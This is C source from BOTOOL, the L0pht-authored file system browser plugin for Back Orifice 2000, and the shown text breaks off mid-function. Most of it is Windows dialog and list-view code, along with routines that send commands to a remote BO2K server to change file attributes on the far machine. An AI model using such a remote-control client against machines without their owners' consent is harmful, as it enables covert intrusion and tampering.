/*  BOTOOL - Back Orifice 2000 File System and Registry Browser/Editor
    Copyright (C) 1999, L0pht Heavy Industries, Inc.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<commctrl.h>
#include<plugins.h>
#include<bocomreg.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<config.h>
#include"comm_native.h"
#include"botool.h"
#include"explore.h"
#include"explorefunc.h"
#include<resource.h>
#include<afxres.h>
#include"strhandle.h"
#include"commnet.h"
#include<shlobj.h>


// XferDlgProc: Transfer dialog procedure

BOOL CALLBACK XferDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	WORD wNotifyCode,wID;
	HWND hwndCtl;

	switch(uMsg) {
	case WM_INITDIALOG:
		return TRUE;
	case WM_CLOSE:
		
		return TRUE;
	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDCANCEL:
			PostMessage(hwndDlg,WM_CLOSE,0,0);
			return TRUE;
		}
	}

	return FALSE;	
}

// CreateXferDialog: Creates a transfer dialog window (modeless)

HWND CreateXferDialog(HINSTANCE hInst, HWND hParent)
{	
	return CreateDialog(hInst,MAKEINTRESOURCE(IDD_XFERDLG),hParent,XferDlgProc);
}

void XferDlg_SetSrcFile(HWND hwndXfer,char *svSrcPath, char *svAddr)
{
	char svText[260];
	if(svAddr!=NULL) {
		wsprintf(svText,"%.120s (%.120s)",svSrcPath,svAddr);
	} else {
		lstrcpyn(svText,svSrcPath,260);
	}
	SetDlgItemText(hwndXfer,IDC_SRCFILE,svText);
}
	
void XferDlg_SetDstFile(HWND hwndXfer,char *svDstPath, char *svAddr)
{
	char svText[260];
	if(svAddr!=NULL) {
		wsprintf(svText,"%.120s (%.120s)",svDstPath,svAddr);
	} else {
		lstrcpyn(svText,svDstPath,260);
	}
	SetDlgItemText(hwndXfer,IDC_DSTFILE,svText);
}

void XferDlg_SetTotalSize(HWND hwndXfer,DWORD dwTotalSize)
{
	SetDlgItemInt(hwndXfer,IDC_BYTETOTAL,dwTotalSize,FALSE);
	SendDlgItemMessage(hwndXfer,IDC_PROGRESS,PBM_SETRANGE32,0,dwTotalSize);
}

void XferDlg_SetCount(HWND hwndXfer,DWORD dwCount)
{
	SetDlgItemInt(hwndXfer,IDC_BYTECOUNT,dwCount,FALSE);
	SendDlgItemMessage(hwndXfer,IDC_PROGRESS,PBM_SETPOS,dwCount,0);
}

BOOL PumpXferDialog(HWND hwndXfer)
{
	MSG msg;
	if(PeekMessage(&msg,hwndXfer,0,0,PM_REMOVE)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
		if(msg.message==WM_CLOSE)
			return FALSE;
	}
	return TRUE;
}
		

// TransferPropDlgProc: Dialog Procedure for transfer properties

BOOL CALLBACK TransferPropDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	EXPLORE_CONTEXT *excontext=(EXPLORE_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
	WORD wNotifyCode,wID;
	HWND hwndCtl;

	switch(uMsg) {
	case WM_INITDIALOG:
		SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
		excontext=(EXPLORE_CONTEXT *)lParam;
		
		CheckDlgButton(hwndDlg,IDC_RANDOM,excontext->bRandomBind?BST_CHECKED:BST_UNCHECKED);
		SetDlgItemText(hwndDlg,IDC_BINDINGSTRING,excontext->svBindStr);
		SetDlgItemText(hwndDlg,IDC_CONNECTSTRING,excontext->svConnectStr);
		EnableWindow(GetDlgItem(hwndDlg,IDC_BINDINGSTRING),!excontext->bRandomBind);
		EnableWindow(GetDlgItem(hwndDlg,IDC_BINDINGSTRINGTEXT),!excontext->bRandomBind);

		return TRUE;
	case WM_CLOSE:
		EndDialog(hwndDlg,IDCANCEL);
		return TRUE;
	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDC_RANDOM:
			EnableWindow(GetDlgItem(hwndDlg,IDC_BINDINGSTRING),!IsDlgButtonChecked(hwndDlg,IDC_RANDOM));
			EnableWindow(GetDlgItem(hwndDlg,IDC_BINDINGSTRINGTEXT),!IsDlgButtonChecked(hwndDlg,IDC_RANDOM));
			return TRUE;
		case IDOK:
			GetDlgItemText(hwndDlg,IDC_CONNECTSTRING,excontext->svConnectStr,260);
			GetDlgItemText(hwndDlg,IDC_BINDINGSTRING,excontext->svBindStr,260);
			excontext->bRandomBind=IsDlgButtonChecked(hwndDlg,IDC_RANDOM);
			EndDialog(hwndDlg,IDOK);
			return TRUE;
		case IDCANCEL:
			EndDialog(hwndDlg,IDCANCEL);
			return TRUE;
		}
	}

	return FALSE;
}

// DoTransferProps: Shows the transfer properties dialog

void DoTransferProperties(EXPLORE_CONTEXT *excontext)
{
	DialogBoxParam(g_hInstance,MAKEINTRESOURCE(IDD_TRANSFERPROPS),excontext->hDialog,TransferPropDlgProc,(LPARAM)excontext);
}


// PropDlgProc: Dialog Procedure for File Browser client

BOOL CALLBACK PropDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	EXPLORE_CONTEXT *excontext=(EXPLORE_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
	WORD wNotifyCode,wID;
	HWND hwndCtl;
	char svText[260];
	char svText2[260];
	char svText3[260];

	switch(uMsg) {
	case WM_INITDIALOG:
		SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
		excontext=(EXPLORE_CONTEXT *)lParam;
		
		SendDlgItemMessage(hwndDlg,IDC_FILEICON,STM_SETICON,(WPARAM)(excontext->pshfi->hIcon),0);

		wsprintf(svText,"%.100s Properties",excontext->pexfi->svName);
		SendMessage(hwndDlg,WM_SETTEXT,0,(LPARAM)svText);

		SetDlgItemText(hwndDlg,IDC_NAME,excontext->pexfi->svName);
		SetDlgItemText(hwndDlg,IDC_TYPE,excontext->pshfi->szTypeName);
		SetDlgItemText(hwndDlg,IDC_LOCATION,excontext->svLocation);
		

		if(excontext->pexfi->nType!=0) {
			DWORD size=excontext->pexfi->dwSize;
			if(size>(1024*1024)) {
				size/=(1024*1024);
				wsprintf(svText,"%uMB (%u bytes)",size,excontext->pexfi->dwSize);
			} else if(size>1024) {
				size/=1024;
				wsprintf(svText,"%uKB (%u bytes)",size,excontext->pexfi->dwSize);
			} else {
				wsprintf(svText,"%u bytes (%u bytes)",size,excontext->pexfi->dwSize);
			}
			SetDlgItemText(hwndDlg,IDC_FILESIZE,svText);
		}

		GetDateFormat(LOCALE_SYSTEM_DEFAULT,DATE_LONGDATE,&(excontext->pexfi->stTime),NULL,svText,260);
		GetTimeFormat(LOCALE_SYSTEM_DEFAULT,0,&(excontext->pexfi->stTime),NULL,svText2,260);
		wsprintf(svText3,"%.100s %.100s",svText2,svText);
		
		SetDlgItemText(hwndDlg,IDC_MSDOSNAME,excontext->pexfi->svShortName);
		SetDlgItemText(hwndDlg,IDC_CREATED,svText3);
		
		if(excontext->pexfi->dwFlags & EXFI_A) CheckDlgButton(hwndDlg,IDC_ATTR_A,BST_CHECKED);
		if(excontext->pexfi->dwFlags & EXFI_R) CheckDlgButton(hwndDlg,IDC_ATTR_R,BST_CHECKED);
		if(excontext->pexfi->dwFlags & EXFI_S) CheckDlgButton(hwndDlg,IDC_ATTR_S,BST_CHECKED);
		if(excontext->pexfi->dwFlags & EXFI_H) CheckDlgButton(hwndDlg,IDC_ATTR_H,BST_CHECKED);
		if(excontext->pexfi->dwFlags & EXFI_D) CheckDlgButton(hwndDlg,IDC_ATTR_D,BST_CHECKED);
		if(excontext->pexfi->dwFlags & EXFI_C) CheckDlgButton(hwndDlg,IDC_ATTR_C,BST_CHECKED);
		if(excontext->pexfi->dwFlags & EXFI_T) CheckDlgButton(hwndDlg,IDC_ATTR_T,BST_CHECKED);
		
		excontext->dwNewAttr=excontext->pexfi->dwFlags;


		return TRUE;
	case WM_CLOSE:
		EndDialog(hwndDlg,IDCANCEL);
		return TRUE;
	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDC_ATTR_A:
			excontext->dwNewAttr &= ~EXFI_A;
			if(IsDlgButtonChecked(hwndDlg,IDC_ATTR_A)) excontext->dwNewAttr |= EXFI_A;
			return TRUE;
		case IDC_ATTR_R:
			excontext->dwNewAttr &= ~EXFI_R;
			if(IsDlgButtonChecked(hwndDlg,IDC_ATTR_R)) excontext->dwNewAttr |= EXFI_R;
			return TRUE;
		case IDC_ATTR_S:
			excontext->dwNewAttr &= ~EXFI_S;
			if(IsDlgButtonChecked(hwndDlg,IDC_ATTR_S)) excontext->dwNewAttr |= EXFI_S;
			return TRUE;
		case IDC_ATTR_H:
			excontext->dwNewAttr &= ~EXFI_H;
			if(IsDlgButtonChecked(hwndDlg,IDC_ATTR_H)) excontext->dwNewAttr |= EXFI_H;
			return TRUE;
		case IDC_ATTR_T:
			excontext->dwNewAttr &= ~EXFI_T;
			if(IsDlgButtonChecked(hwndDlg,IDC_ATTR_T)) excontext->dwNewAttr |= EXFI_T;
			return TRUE;
		case IDOK:
			EndDialog(hwndDlg,IDOK);
			return TRUE;
		case IDCANCEL:
			EndDialog(hwndDlg,IDCANCEL);
			return TRUE;
		}
	}

	return FALSE;
}


// DoProperties: Shows the properties panel for a selected item

void DoProperties(EXPLORE_CONTEXT *excontext)
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;

	int i,count;
	HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
	count=ListView_GetItemCount(hlv);
	for(i=0;i<count;i++) {
		if(ListView_GetItemState(hlv,i,LVIS_FOCUSED)&LVIS_FOCUSED)
			break;
		}
	if(i!=count) {	
		HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
		
		LVITEM lvi;
		lvi.mask=LVIF_PARAM;
		lvi.iItem=i;
		lvi.iSubItem=0;
		ListView_GetItem(hlv,&lvi);
		EXFILEINFO *exfi=(EXFILEINFO *)lvi.lParam;
		
		SHFILEINFO shfi;
		if(exfi->dwFlags & EXFI_D) {
			SHGetFileInfo("foobar",FILE_ATTRIBUTE_DIRECTORY,&shfi,sizeof(SHFILEINFO),SHGFI_USEFILEATTRIBUTES|SHGFI_TYPENAME|SHGFI_ICON);
		} else {
			SHGetFileInfo(exfi->svName,exfi->dwFlags,&shfi,sizeof(SHFILEINFO),SHGFI_USEFILEATTRIBUTES|SHGFI_TYPENAME|SHGFI_ICON);
		}

		excontext->pshfi=&shfi;
		excontext->pexfi=exfi;

		if(DialogBoxParam(g_hInstance,MAKEINTRESOURCE(IDD_PROPERTIES),excontext->hDialog,PropDlgProc,(LPARAM)excontext)==IDOK) {
			if(excontext->dwNewAttr!=exfi->dwFlags) {
				char svPath[260];
				lstrcpyn(svPath,excontext->svLocation,260);
				if(lstrlen(svPath)>0) {
					if(svPath[lstrlen(svPath)-1]!='\\') {
						lstrcpyn(svPath+lstrlen(svPath),"\\",260-lstrlen(svPath));
					}
				}
				lstrcpyn(svPath+lstrlen(svPath),exfi->svName,260-lstrlen(svPath));
				
				char svAttr[7];
				svAttr[0]='\0';
				if(excontext->dwNewAttr & EXFI_A) lstrcat(svAttr,"A");
				if(excontext->dwNewAttr & EXFI_R) lstrcat(svAttr,"R");
				if(excontext->dwNewAttr & EXFI_S) lstrcat(svAttr,"S");
				if(excontext->dwNewAttr & EXFI_H) lstrcat(svAttr,"H");
				if(excontext->dwNewAttr & EXFI_T) lstrcat(svAttr,"T");

				IssueAuthCommandRequest(excontext->pSock,BO_SETFILEATTR,GetTickCount(),0,svPath,svAttr);
				while((nRet=excontext->pSock->Recv(&data,&len))<=0) Sleep(20);
				if(nRet==-1) { ExploreDisconnect(excontext); return; }
				BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);

				if(strncmp(svArg2,"Could not",9)==0) {
					char svText[512];
					wsprintf(svText,"%.256s",svArg2);
					MessageBox(NULL,svArg2,"File modification error",MB_YESNO|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
					excontext->pSock->Free(data);
					return;
				}
				excontext->pSock->Free(data);

				exfi->dwFlags=excontext->dwNewAttr;
				UpdateFileList(excontext);
			}
		}

		DestroyIcon(shfi.hIcon);
	}
}


// ListViewProc: Catches list view right click to do popup menu

BOOL CALLBACK ListViewProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	HMENU hm,hmenu;
	POINT pt;
	int nCmd;
		
	switch(uMsg) {
	case WM_RBUTTONDOWN:
		CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,WM_RBUTTONDOWN,wParam,lParam);
		CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,WM_RBUTTONUP,wParam,lParam);

		hm=LoadMenu(g_hInstance,MAKEINTRESOURCE(IDR_EXPLOREPOPUP));
		hmenu=GetSubMenu(hm,0);
		GetCursorPos(&pt);
		nCmd=TrackPopupMenu(hmenu,TPM_RETURNCMD|TPM_RIGHTBUTTON,pt.x,pt.y,0,GetParent(hwndDlg),NULL);
		if(nCmd>0) {
			SendMessage(GetParent(hwndDlg),WM_COMMAND,MAKEWPARAM(nCmd,0),NULL);
		}
		DestroyMenu(hm);			
		return TRUE;
	case WM_RBUTTONUP:

		return TRUE;
	}

	return CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,uMsg,wParam,lParam);
}


// CatchEnterProc: Catches the enter key in the location bar and goes to the directory

BOOL CALLBACK CatchEnterProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch(uMsg) {
	case WM_KEYDOWN:
		if(wParam==VK_RETURN) {
			SendMessage(GetParent(hwndDlg),WM_GOTOLOCATION,0,0);
			return TRUE;
		}
	case WM_KEYUP:
		if(wParam==VK_RETURN) {
			return TRUE;
		}
	case WM_CHAR:
		if(wParam==13) {
			return TRUE;
		}
	}

	return CallWindowProc((WNDPROC)GetWindowLong(hwndDlg,GWL_USERDATA),hwndDlg,uMsg,wParam,lParam);
}


// ExploreDlgProc: Dialog Procedure for File Browser client

BOOL CALLBACK ExploreDlgProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	EXPLORE_CONTEXT *excontext=(EXPLORE_CONTEXT *)GetWindowLong(hwndDlg,GWL_USERDATA);
		
	WORD wID,wNotifyCode;
	HWND hwndCtl;
	char svName[260], *svFilePart;
							
	switch(uMsg) {
	case WM_INITDIALOG:
		SetWindowLong(hwndDlg,GWL_USERDATA,(LONG)lParam);
		
		// Initialize explore context
		excontext=(EXPLORE_CONTEXT *)lParam;
		excontext->hDialog=hwndDlg;
	
		// Misc
		excontext->pSock=NULL;
		excontext->svAddress[0]='\0';

		// Load icons
		excontext->hGoIcon=(HICON)LoadImage(g_hInstance,MAKEINTRESOURCE(IDI_GODIR),IMAGE_ICON,16,16,0);
		excontext->hGoUpIcon=(HICON)LoadImage(g_hInstance,MAKEINTRESOURCE(IDI_GOUPDIR),IMAGE_ICON,16,16,0);
		excontext->hLargeIcon=(HICON)LoadImage(g_hInstance,MAKEINTRESOURCE(IDI_CDCFOLDER),IMAGE_ICON,32,32,0);
		excontext->hSmallIcon=(HICON)LoadImage(g_hInstance,MAKEINTRESOURCE(IDI_CDCFOLDER),IMAGE_ICON,16,16,0);

		// Set icons
		SendMessage(hwndDlg,WM_SETICON,ICON_BIG,(LPARAM)excontext->hLargeIcon);
		SendMessage(hwndDlg,WM_SETICON,ICON_SMALL,(LPARAM)excontext->hSmallIcon);
		SendDlgItemMessage(hwndDlg,IDC_GODIR,BM_SETIMAGE,IMAGE_ICON,(LPARAM)excontext->hGoIcon);
		SendDlgItemMessage(hwndDlg,IDC_GOUPDIR,BM_SETIMAGE,IMAGE_ICON,(LPARAM)excontext->hGoUpIcon);

		// Set menu
		excontext->hDlgMenu=LoadMenu(g_hInstance,MAKEINTRESOURCE(IDR_EXPLOREMENU));
		SetMenu(hwndDlg,excontext->hDlgMenu);
		DrawMenuBar(hwndDlg);

		// Create listview settings
		{
			LVCOLUMN col;
			hwndCtl=GetDlgItem(hwndDlg,IDC_FILELIST);
			col.mask=LVCF_FMT|LVCF_WIDTH|LVCF_TEXT|LVCF_ORDER|LVCF_SUBITEM;
			col.fmt=LVCFMT_LEFT;
			col.cx=120;
			col.pszText="Name";
			col.iSubItem=0;
			col.iOrder=0;
			ListView_InsertColumn(hwndCtl,0,&col);
			col.mask=LVCF_FMT|LVCF_WIDTH|LVCF_TEXT|LVCF_ORDER|LVCF_SUBITEM;
			col.fmt=LVCFMT_RIGHT;
			col.cx=80;
			col.pszText="Size";
			col.iSubItem=1;
			col.iOrder=1;
			ListView_InsertColumn(hwndCtl,1,&col);
			col.mask=LVCF_FMT|LVCF_WIDTH|LVCF_TEXT|LVCF_ORDER|LVCF_SUBITEM;
			col.fmt=LVCFMT_LEFT;
			col.cx=100;
			col.pszText="Type";
			col.iSubItem=2;
			col.iOrder=2;
			ListView_InsertColumn(hwndCtl,2,&col);
			col.mask=LVCF_FMT|LVCF_WIDTH|LVCF_TEXT|LVCF_ORDER|LVCF_SUBITEM;
			col.fmt=LVCFMT_LEFT;
			col.cx=100;
			col.pszText="Modified";
			col.iSubItem=3;
			col.iOrder=3;
			ListView_InsertColumn(hwndCtl,3,&col);
			col.mask=LVCF_FMT|LVCF_WIDTH|LVCF_TEXT|LVCF_ORDER|LVCF_SUBITEM;
			col.fmt=LVCFMT_RIGHT;
			col.cx=80;
			col.pszText="Attributes";
			col.iSubItem=4;
			col.iOrder=4;
			ListView_InsertColumn(hwndCtl,4,&col);

			SHFILEINFO shfi;
			excontext->hImageList=(HIMAGELIST) SHGetFileInfo("foo.exe",0,&shfi,sizeof(SHFILEINFO),SHGFI_USEFILEATTRIBUTES|SHGFI_ICON|SHGFI_LARGEICON|SHGFI_SYSICONINDEX);
			excontext->hImageListSm=(HIMAGELIST) SHGetFileInfo("foo.exe",0,&shfi,sizeof(SHFILEINFO),SHGFI_USEFILEATTRIBUTES|SHGFI_ICON|SHGFI_SMALLICON|SHGFI_SYSICONINDEX);
			
			ListView_SetImageList(hwndCtl,excontext->hImageList,LVSIL_NORMAL);
			ListView_SetImageList(hwndCtl,excontext->hImageListSm,LVSIL_SMALL);
		}
		
		// Set initial sorting directions
		excontext->nLastSort=2;
		excontext->bSortDir[0]=FALSE;
		excontext->bSortDir[1]=FALSE;
		excontext->bSortDir[2]=FALSE;
		excontext->bSortDir[3]=FALSE;
		excontext->bSortDir[4]=FALSE;

		// Disable items
		SendMessage(hwndDlg,WM_ENABLEITEMS,0,(LPARAM)FALSE);
		excontext->pFiles=NULL;
	
		// Create Status Bar
		excontext->hStatus=CreateStatusWindow(WS_VISIBLE|WS_CHILD,"Disconnected",hwndDlg,IDC_STATUS);

		// Check menu items
		CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWLARGE,  MF_UNCHECKED);
		CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWSMALL,  MF_UNCHECKED);
		CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWLIST,   MF_UNCHECKED);
		CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWDETAILS,MF_CHECKED);
	
		{
			// Subclass edit control
			HWND hLoc=GetDlgItem(excontext->hDialog,IDC_LOCATION);
			SetWindowLong(hLoc,GWL_USERDATA,GetWindowLong(hLoc,GWL_WNDPROC));
			SetWindowLong(hLoc,GWL_WNDPROC,(LONG)CatchEnterProc);
			// Subclass list view
			hLoc=GetDlgItem(excontext->hDialog,IDC_FILELIST);
			SetWindowLong(hLoc,GWL_USERDATA,GetWindowLong(hLoc,GWL_WNDPROC));
			SetWindowLong(hLoc,GWL_WNDPROC,(LONG)ListViewProc);
		}
	
		// Transfer options
		HKEY key;
		DWORD cbLen;
		RegCreateKey(HKEY_CURRENT_USER,"Software\\L0pht\\Filesystem Browser",&key);
		cbLen=sizeof(BOOL);
		RegQueryValueEx(key,"Random Binding",NULL,NULL,(BYTE *)&(excontext->bRandomBind),&cbLen);
		cbLen=260;
		RegQueryValueEx(key,"Binding String",NULL,NULL,(BYTE *)(excontext->svBindStr),&cbLen);
		cbLen=260;
		RegQueryValueEx(key,"Connect String",NULL,NULL,(BYTE *)(excontext->svConnectStr),&cbLen);
		RegCloseKey(key);

		return TRUE;

	case WM_ENABLEITEMS:
		EnableWindow(GetDlgItem(hwndDlg,IDC_GODIR),lParam);
		EnableWindow(GetDlgItem(hwndDlg,IDC_GOUPDIR),lParam);
		EnableWindow(GetDlgItem(hwndDlg,IDC_LOCATION),lParam);
		EnableWindow(GetDlgItem(hwndDlg,IDC_FILELIST),lParam);
		return TRUE;

	case WM_CLOSE:
		PostQuitMessage(0);
		return TRUE;

	case WM_WINDOWPOSCHANGED:
		{
			LPWINDOWPOS lpwp=(LPWINDOWPOS)lParam;
			if(((lpwp->flags & SWP_NOSIZE)==0) || (IsWindowVisible(hwndDlg)==FALSE)) {
				int width=lpwp->cx-(GetSystemMetrics(SM_CXSIZEFRAME)*2);
				int height=lpwp->cy-(GetSystemMetrics(SM_CYSIZEFRAME)*2)-GetSystemMetrics(SM_CYMENU)-GetSystemMetrics(SM_CYCAPTION);
				SetWindowPos(GetDlgItem(hwndDlg,IDC_LOCATION),NULL,50,4,width-106,22,SWP_NOZORDER|SWP_NOREPOSITION|SWP_NOREDRAW);
				SetWindowPos(GetDlgItem(hwndDlg,IDC_GODIR),NULL,width-53,4,24,22,SWP_NOZORDER|SWP_NOREPOSITION|SWP_NOREDRAW);
				SetWindowPos(GetDlgItem(hwndDlg,IDC_GOUPDIR),NULL,width-27,4,24,22,SWP_NOZORDER|SWP_NOREPOSITION|SWP_NOREDRAW);
				SetWindowPos(GetDlgItem(hwndDlg,IDC_FILELIST),NULL,0,28,width-1,height-48,SWP_NOZORDER|SWP_NOREPOSITION|SWP_NOREDRAW);
				SetWindowPos(GetDlgItem(hwndDlg,IDC_STATUS),NULL,1,height-44,width-4,16,SWP_NOZORDER|SWP_NOREPOSITION|SWP_NOREDRAW);
				InvalidateRect(hwndDlg,NULL,TRUE);
				return TRUE;
			} 
		}
		return FALSE;
	case WM_NOTIFY:
		{
			int idCtrl = (int) wParam;
			LPNMHDR pnmh = (LPNMHDR) lParam;

			switch(pnmh->code)
			{
			case HDN_ITEMCLICK:
				{
					LPNMHEADER lpnmh = (LPNMHEADER) lParam;
					if(excontext->nLastSort==lpnmh->iItem) {
						excontext->bSortDir[lpnmh->iItem]=!excontext->bSortDir[lpnmh->iItem];
					}
					excontext->nLastSort=lpnmh->iItem;
					ListView_SortItems(GetDlgItem(hwndDlg,IDC_FILELIST),SortListItems,(LPARAM)excontext);
				}
				return TRUE;
			case NM_DBLCLK:
				if(pnmh->hwndFrom==GetDlgItem(hwndDlg,IDC_FILELIST)) {
					HWND hlv=pnmh->hwndFrom;
					int count,nItem;
					count=ListView_GetItemCount(hlv);
					for(nItem=0;nItem<count;nItem++) {
						if(ListView_GetItemState(hlv,nItem,LVIS_FOCUSED) & LVIS_FOCUSED) break;
					}
					if(nItem==count) return FALSE;
									
					LVITEM lvi;
					lvi.mask=LVIF_PARAM;
					lvi.iItem=nItem;
					lvi.iSubItem=0;
					ListView_GetItem(hlv,&lvi);
					EXFILEINFO *exfi=(EXFILEINFO *)lvi.lParam;
					if(exfi->dwFlags & EXFI_D) {
						char svName[260], *svFilePart;
						lstrcpyn(svName,exfi->svName,260);
						lstrcpyn(excontext->svLocation+lstrlen(excontext->svLocation),svName,260-lstrlen(excontext->svLocation));
						lstrcpyn(svName,excontext->svLocation,260);
						GetFullPathName(svName,260,excontext->svLocation,&svFilePart);
						
						SetDlgItemText(hwndDlg,IDC_LOCATION,excontext->svLocation);
						SendMessage(hwndDlg,WM_GOTOLOCATION,0,0);
					}
				}
				return TRUE;
			case LVN_BEGINLABELEDIT:
				if(pnmh->hwndFrom==GetDlgItem(hwndDlg,IDC_FILELIST)) {
					NMLVDISPINFO *pdi=(NMLVDISPINFO *) lParam;
					ListView_GetItemText(pnmh->hwndFrom,pdi->item.iItem,0,excontext->svOldName,260);
					SetWindowLong(hwndDlg,DWL_MSGRESULT,FALSE);
					return TRUE;
				}
				SetWindowLong(hwndDlg,DWL_MSGRESULT,TRUE);
				return FALSE;
			case LVN_ENDLABELEDIT:
				if(pnmh->hwndFrom==GetDlgItem(hwndDlg,IDC_FILELIST)) {
					NMLVDISPINFO *pdi=(NMLVDISPINFO *) lParam;
					if(pdi->item.pszText!=NULL) {
						if(strrchr(pdi->item.pszText,'\\')!=NULL) 
							return FALSE;
						if(RenameItem(excontext,excontext->svOldName,pdi->item.pszText,FALSE,TRUE)) {
							// Change internal list item
							EXFILEINFO *fi=excontext->pFiles;
							while(fi!=NULL) {
								if(lstrcmp(fi->svName,excontext->svOldName)==0) {
									lstrcpyn(fi->svName,pdi->item.pszText,260);
									break;
								}
								fi=fi->pNext;
							}
							SetWindowLong(hwndDlg,DWL_MSGRESULT,TRUE);
							return TRUE;
						}
					}
					SetWindowLong(hwndDlg,DWL_MSGRESULT,FALSE);
					return TRUE;
				}
				return FALSE;
			case LVN_KEYDOWN:
				if(pnmh->hwndFrom==GetDlgItem(hwndDlg,IDC_FILELIST)) {
					NMLVKEYDOWN *pnkd=(NMLVKEYDOWN *)lParam;
					if(pnkd->wVKey==VK_DELETE) {
						SendMessage(excontext->hDialog,WM_COMMAND,MAKEWPARAM(IDM_DELETE,1),NULL);
					}
					else if(pnkd->wVKey=='C') {
						if((GetKeyState(VK_CONTROL) & 0x8000)==0x8000) {
							SendMessage(excontext->hDialog,WM_COMMAND,MAKEWPARAM(ID_EDIT_COPY,1),NULL);
						}
					}
					else if(pnkd->wVKey=='X') {
						if((GetKeyState(VK_CONTROL) & 0x8000)==0x8000) {
							SendMessage(excontext->hDialog,WM_COMMAND,MAKEWPARAM(ID_EDIT_CUT,1),NULL);
						}
					}
					else if(pnkd->wVKey=='V') {
						if((GetKeyState(VK_CONTROL) & 0x8000)==0x8000) {
							SendMessage(excontext->hDialog,WM_COMMAND,MAKEWPARAM(ID_EDIT_PASTE,1),NULL);
						}
					}

				}
				return FALSE;
			case LVN_BEGINDRAG:
				if(pnmh->hwndFrom==GetDlgItem(hwndDlg,IDC_FILELIST)) {
					NMLISTVIEW *pnmv=(NMLISTVIEW *)lParam;
					HWND capOld=SetCapture(hwndDlg);
					RECT r,cr;
					GetClientRect(pnmh->hwndFrom,&cr);
					GetClientRect(pnmh->hwndFrom,&r);
					MapWindowPoints(pnmh->hwndFrom,NULL,(POINT *)&r,2);
					HCURSOR curOld;
					BOOL bCopy;
					if((GetKeyState(VK_CONTROL) & 0x8000)==0x8000) {
						curOld=SetCursor(LoadCursor(g_hInstance,MAKEINTRESOURCE(IDC_DRAGCOPYPOINTER)));
						bCopy=TRUE;
					} else {
						curOld=SetCursor(LoadCursor(g_hInstance,MAKEINTRESOURCE(IDC_DRAGPOINTER)));
						bCopy=FALSE;
					}
					ClipCursor(&r);
					int i,count;

					BOOL bDone=FALSE,bCancel=FALSE;
					MSG msg;
					while(!bDone) {
						GetMessage(&msg,hwndDlg,0,0);
						TranslateMessage(&msg);
						DispatchMessage(&msg);
						if(msg.message==WM_LBUTTONUP) 
							bDone=TRUE;
						if(msg.message==WM_KEYDOWN) {
							if(msg.wParam==VK_ESCAPE) {
								bDone=TRUE;
								bCancel=TRUE;
							}
						}
						
						// Select item under cursor
						if(msg.message==WM_MOUSEMOVE) {
							RECT br;
							POINT pt;
							pt.x=LOWORD(msg.lParam);
							pt.y=HIWORD(msg.lParam);
							MapWindowPoints(hwndDlg,pnmh->hwndFrom,&pt,1);
							
							count=ListView_GetItemCount(pnmh->hwndFrom);
							for(i=0;i<count;i++) {
								ListView_GetItemRect(pnmh->hwndFrom,i,&br,LVIR_BOUNDS);
								if(PtInRect(&br,pt)) break;
							}
							if(i!=count) {
								ListView_SetItemState(pnmh->hwndFrom,i,LVIS_FOCUSED,LVIS_FOCUSED);
							}
														
							if(pt.y<=cr.top+4)
								SendMessage(pnmh->hwndFrom,LVM_SCROLL,0,-16);
							if(pt.x<=cr.left+4) 
								SendMessage(pnmh->hwndFrom,LVM_SCROLL,-16,0);
							if(pt.y>=cr.bottom-4) 
								SendMessage(pnmh->hwndFrom,LVM_SCROLL,0,16);
							if(pt.x>=cr.right-4) 
								SendMessage(pnmh->hwndFrom,LVM_SCROLL,16,0);
						}
						if(msg.message==WM_KEYDOWN) {
							if(msg.wParam==VK_CONTROL && !bCopy) {
								DestroyCursor(SetCursor(curOld));
